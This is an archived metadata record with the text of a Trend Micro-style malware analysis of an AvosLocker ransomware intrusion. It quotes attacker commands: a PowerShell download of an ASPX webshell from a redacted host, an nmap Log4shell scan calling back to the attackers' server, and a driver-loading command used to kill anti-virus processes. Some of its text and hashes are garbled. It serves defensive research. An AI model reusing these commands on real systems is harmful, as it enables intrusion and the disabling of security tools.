{
    "id": "022392fe-dcd4-46e7-84dc-f508a0cdae15",
    "created_at": "2023-01-12T14:59:00.283731Z",
    "updated_at": "2025-03-27T02:06:03.860076Z",
    "deleted_at": null,
    "sha1_hash": "6725d624792af6a420a6687bbf8798794d2c7971",
    "title": "2022-05-02 - AvosLocker Ransomware Variant Abuses Driver File to Disable Anti-Virus, Scans for Log4shell",
    "authors": "",
    "file_creation_date": "2022-05-28T17:08:17Z",
    "file_modification_date": "2022-05-28T17:08:17Z",
    "file_size": 1980427,
    "plain_text": "# AvosLocker Ransomware Variant Abuses Driver File to Disable Anti-Virus, Scans for Log4shell\n\n**[trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html](https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html)**\n\nMay 2, 2022\n\nRansomware\n\nWe found an AvosLocker ransomware variant using a legitimate anti-virus component to disable detection and blocking solutions.\n\nBy: Christoper Ordonez, Alvin Nieto May 02, 2022 Read time: ( words)\n\n[We found samples of AvosLocker](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-avoslocker) [ransomware that makes use of a legitimate driver file to disable anti-virus solutions and detection evasion.](https://www.trendmicro.com/vinfo/us/security/definition/ransomware)\nWhile previous AvosLocker infections employ similar routines, this is the first sample we observed from the US with the capability to disable a\ndefense solution using a legitimate Avast Anti-Rootkit Driver file (asWarPot.sys). In addition, the ransomware is also capable of scanning\nmultiple endpoints for the Log4j vulnerability Log4shell using Nmap NSE script.\n\nInfection chain\n\nFigure 1. AvosLocker infection chain\nAccording to our analysis, the suspected entry point is via the Zoho ManageEngine ADSelfService Plus (ADSS) exploit:\n\nFigure 2. The ADSS exploit abusing CVE-2021\n40539\nDue to the lack of network traffic details, we could not identify the exact CVE ID of the security gap the attacker used. However, there are some\n[indications that they abused the same vulnerability previously documented by Synacktiv during a pentest, CVE-2021-40539. The gap we](https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html)\nobserved was particularly similar to the creation of JSP files (test.jsp), execution of keytool.exe with “null” parameters to run a crafted Java\nclass/code.\n\nMapping the infection\n\nThe ADSS JAVA component (C:\\ManageEngine\\ADSelfService Plus\\jre\\bin\\java.exe) executed mshta.exe to remotely run a remotely-hosted\nHTML application (HTA) file from the attackers’ command and control (C&C) server. Using Trend Micro™ Vision One™, we mapped out the\nprocesses that the infection performed to spawn the process.\n\nFigure 3. Remotely executing an HTA file from the\n\nC&C server. Screenshots taken from Trend Micro Vison One.\n\nFigure 4. HTA file connecting to the C&C\n\nA closer look at the HTA file revealed that the mshta.exe downloads and executes the remotely hosted HTA file. The HTA executed an\nobfuscated PowerShell script that contains a shellcode, capable of connecting back to the C&C server to execute arbitrary commands.\n\n\n-----\n\nFigure 5. Obfuscated PowerShell script contains a shellcode\n\nThe PowerShell process will download an ASPX webshell from the C&C server using the command < cmd.exe /c powershell -command\n_Invoke-WebRequest -Uri hxxp://xx.xx.xx.xx/subshell.aspx -OutFile /ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide >._\nAccording to Synacktiv’s [research, with this command, the downloaded ASPX webshell is downloaded from a remote IP address and saved to](https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html#:~:text=For%20a%20little%20more%20confort%2C%20it%20is%20also%20possible%20to%20exploit%20the%20file%20upload%20to%20write%20a%20JSP%20webshell%20on%20the%20filesystem.%20It%20can%20then%20be%20moved%20into%20the%20webroot%20with%20the%20Java%20code%20execution.)\nthe directory, and still accessible to the attacker. The attackers gathered system information using available tools such as whoami and\nsysteminfo, as well as PowerShell commands.\n\nFigure 6. Gather system information\n\nThe code executes on the current domain controller to gather the username information, while the query user information gathers data about\nuser sessions on a Remote Desktop Session Host server, name of the user, session ID, state of the session (either active or disconnected),\nidle time, date, and time the user logged on.\n\nFigure 7. Executed with the /domain argument to collect username\n\ninformation\n\nFigure 8. query user information for session data\nThe PowerShell downloads, installs, and allows the remote desktop tool AnyDeskMSI through the firewall.\n\nFigure 9. The PowerShell downloading and installing AnyDeskMSI\nWe observed that a new user account was created, added to the current domain, and included in the administrator group. This ensures the\nattacker can have administrative rights to the infected system. The attackers also checked the running processes in the system via TaskList to\ncheck for anti-virus processes running in the infiltrated system.\n\nFigure 10. Creating a new account with admin rights\n\nFigure 11. Checking for anti-virus processes running\n\nDuring the scan, we observed an attempt to terminate security products initiated via TaskKill. Testing the sample with Trend Micro Vision One,\nthe attempt failed as its sensors were still able to send activity data to the platform.\n\n\n-----\n\nFigure 12. Terminating security products running\n\nTools and functions\n\nAdditional tools and components were copied to the compromised machine using AnyDeskMSI to scan the local network and disable security\nproducts. The tools transferred using AnyDesk are:\n\nNetscan: To scan for other endpoints\nNmap (log4shell.nse): To scan for [Log4shell vulnerable endpoints](https://www.trendmicro.com/en_us/research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html)\nHacking tools Mimikatz and Impacket: For lateral movement\nPDQ deploy: For mass deployment of malicious script to multiple endpoints\n[Aswarpot.sys: For disabling defense solutions. We noted that it can disable a number of anti-virus products, previously identified by Aon’s](https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/#:~:text=Utilizing%20the%20HashDB,McAfee%C2%AE%2C%20and%20Malwarebytes%C2%AE.%C2%A0)\nresearchers.\n\nFigure 13. Copying tools and other malicious\n\ncomponents to the compromised machine using AnyDesk\nWe found an Avast anti-rootkit driver installed as service 'asWarPot.sys' using the command sc.exe create aswSP_ArPot2 binPath=\n_C:\\windows\\aswArPot.sys type= kernel. It installs the driver file in preparation for disabling the running anti-virus product. We noted the_\nunusual use of cmd.exe for execution of the file.\n\nFigure 14. Executing the anti-rootkit driver in the\n\nsystem\nMimikatz components were also copied to the affected machine via AnyDeskMSI. However, these components were detected and deleted.\n\nFigure 15. Detecting and deleting Mimikatz\n\nWe observed the PowerShell script disabling the security products by leveraging aswarpot.sys (a legitimate Avast Anti-Rootkit Driver). A list of\nsecurity product processes was supplied and subsequently terminated by the driver.\n\nFigure 16. Listing and terminating the security\n\nproducts found running in the compromised system\nVerification: Manual replication of anti-virus disabling routine\n\nWe manually replicated the routine and commands for disabling the defense solutions to further look into the routine. Figure 17 shows the list\nof processes that the routine searches on infection :\n\nEndpointBasecamp.exe\nTrend Micro Endpoint Basecamp\nResponseService.exe\nPccNTMon.exe\nSupportConnector.exe\nAOTAgent.exe\nCETASvc exe\n\n\n-----\n\nC S c\niVPAgent.exe\ntmwscsvc.exe\nTMResponse\nAOTAgentSvc\nTMBMServer\niVPAgent\nTrend Micro Web Service Communicator\nTmccsf\nTmlisten\nNtrtscan\nTmWSCSvc\n\nFigure 17. Searching for processes\nWe found that aswArPot.sys, registered as aswSP_ArPot2 as a service, is used as the handle for the following DeviceIoControl call.\n\nFigure 18. Driver file preparing to disable an anti-virus product\n\nThe DeviceIoControl function is used to execute parts of the driver. In this case, the DeviceIoControl is inside a loop that iterates through the\nlist of processes mentioned above. Additionally, we can see that 0x9988C094 is passed to DeviceIoControl as an argument simultaneous to\nthe ID of the current process in the iteration.\n\nFigure 19. DeviceIoControl as an argument with the\n\ncurrent process ID\nInside aswArPot.sys, we saw 0x9988C094 in a switch case with a function sub_14001DC80 case. Inside function sub_14001DC80, we can\nsee that that function has the capability to terminate a given process.\n\nFigure 20. 0x9988C094 in a switch case with sub_14001DC80\n\n(above), with the latter value terminating a process (below).\nOther executions and lateral movement\n\n\n-----\n\nte d sab g t e secu ty p oducts, t e acto s be d os oc e aga t ed to t a s e ot e too s, a e y at a d pac et\n\nFigure 21.\n\nExecution of Mimikatz (above) and Impacket via C:\\temp\\wmiexec.exe (below)\nWe also observed the execution of a password recovery tool XenArmor with C:\\temp\\pass\\start.exe.\n\nFigure 22. XenArmor password recovery tool\n\nexecution\nWe observed the attackers using an NMAP script to check for Log4shell, the Apache Log4j remote code execution (RCE, with ID CVE-202144228) vulnerability across the network. They used the command nmap --script log4shell.nse --script-args log4shell.waf-bypass=true --script_args log4shell.callback-server=xx.xx.xx.xx:1389 -p 80,443 xx.xx.xx.xx/xx, and set the callback server to the attacker group C&C server._\n\nFigure 23. Checking for log4shell\n\nWe also observed more system network configuration discovery techniques being run, possibly for lateral movement as it tried looking for\nother available endpoints.\n\nFigure 24. Running more system network configuration discovery scans\n\n**Deploying across the network**\n\nWe saw software deployment tool PDQ being used to deploy malicious batch scripts to multiple endpoints in the network.\n\nFigure 25. Deploying malicious batch scripts to other\n\nendpoints\nThe deployed batch script has the following commands:\n\nDisable Windows Update and Microsoft Defender\n\nFigure 26. Disable Microsoft defense services\n\nPrevents safeboot execution of security products\n\n\n-----\n\nCreate new administrator account\n\n\nFigure 27. Prevent security products’ execution\n\nFigure 28. Create new account\n\n\nAdd the AutoStart mechanism for the AvosLocker executable (update.exe)\n\nDisables legal notice caption\n\nSet safeboot with networking and disables Windows Error Recovery and reboot\n\n\nFigure 29. Add Autostart for ransomware executable\n\nFigure 30. Disable legal notice\n\n\nFigure 31. Setting and disabling network and specific Windows\n\nfunctions\nConclusion\n\n[While AvosLocker has been documented for its abuse of AnyDesk for lateral movement as its preferred application, we note that other remote](https://www.trendmicro.com/en_us/research/21/k/campaign-abusing-rats-uses-fake-websites.html)\naccess applications can also be abused to replace it. We think the same can be said for the software deployment tool, wherein the malicious\nactors can subsequently decide to replace and abuse it with other commercially available ones. In addition, aside from its availability, the\ndecision to choose the specific rootkit driver file is for its capability to execute in kernel mode (therefore operating at a high privilege).\n\nThis variant is also capable of modifying other details of the installed security solutions, such as disabling the legal notice. Other modern\n[ransomware, such as Mespinoza/Pysa, modify the registries of infected systems during their respective routines to inform their victims that](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-as-a-service-enabler-of-widespread-attacks)\nthey have been compromised.\n\nSimilar to previously documented malware and ransomware groups, AvosLocker takes advantage of the different vulnerabilities that have yet\nto be patched to get into organizations’ networks. Once inside, the continuing trend of abusing legitimate tools and functions to mask malicious\nactivities and actors’ presence grows in sophistication. In this case, the attackers were able to study and use Avast’s driver as part of their\narsenal to disable other vendors’ security products.\n\nHowever, and specific to this instance, the attempt to kill an anti-virus product such as this variant’s TaskKill can also be foiled. In this example\nusing Trend Micro Vision One, the attempt was unsuccessful likely due to the product’s self-protection feature, which allowed the sensors to\ncontinue sending data and block the noted routine. The visibility enabled by the platform allowed us as researchers to capture the extent of this\nransomware’s attack chain and replicate the driver file being abused to verify its function during compromise.\n\nAvast responded to our notification with this statement:\n\n_\"We can confirm the vulnerability in an old version of our driver aswArPot.sys, which we fixed in our Avast 21.5 released in June 2021. We also_\n_worked closely with Microsoft, so they released a block in the Windows operating system (10 and 11), so the old version of the Avast driver_\n_can't be loaded to memory._\n\n_The below example shows that the blocking works (output from the \"sc start\" command):_\n\n(SC) StartService FAILED 1275:\n\nThis driver has been blocked from loading\n\n_The update from Microsoft for the Windows operating system was published in February as an optional update, and in Microsoft's security_\n_release in April, so fully updated machines running Windows 10 and 11 are not vulnerable to this kind of attack._\n\n_All consumer and business antivirus versions of Avast and AVG detect and block this AvosLocker ransomware variant, so our users are_\n_protected from this attack vector._\n\n_For users of third-party antivirus software, to stay protected against this vulnerability, we recommend users to update their Windows operating_\n_system with the latest security updates, and to use a fully updated antivirus program.\"_\n\n\n-----\n\nd cato s o Co p o se ( OCs)\n\n**File** **SHA256**\n\nMalicious batch file component a5ad3355f55e1a15baefea83ce81d038531af516f47716018b1dedf\n\nAvosLocker executable 05ba2df0033e3cd5b987d66b6de545df439d338a20165c0ba96cde\n\nMimikatz executable (x32 and x64) 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e\n\ne81a8f8ad804c4d83869d7806a303ff04f31cce376c5df8aada2e9db2c1eeb98 HackTool.Win32.Mimikatz.CNFW\n\nLog4shell Nmap NSE script ddcb0e99f27e79d3536a15e0d51f7f33c38b2ae48677570f36f5e928\n\nImpacket tool 14f0c4ce32821a7d25ea5e016ea26067d6615e3336c3baa854ea37\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-02 - AvosLocker Ransomware Variant Abuses Driver File to Disable Anti-Virus, Scans for Log4shell.pdf"
    ],
    "report_names": [
        "2022-05-02 - AvosLocker Ransomware Variant Abuses Driver File to Disable Anti-Virus, Scans for Log4shell.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535540,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1653757697,
    "ts_modification_date": 1653757697,
    "files": {
        "pdf": "https://archive.orkl.eu/6725d624792af6a420a6687bbf8798794d2c7971.pdf",
        "text": "https://archive.orkl.eu/6725d624792af6a420a6687bbf8798794d2c7971.txt",
        "img": "https://archive.orkl.eu/6725d624792af6a420a6687bbf8798794d2c7971.jpg"
    }
}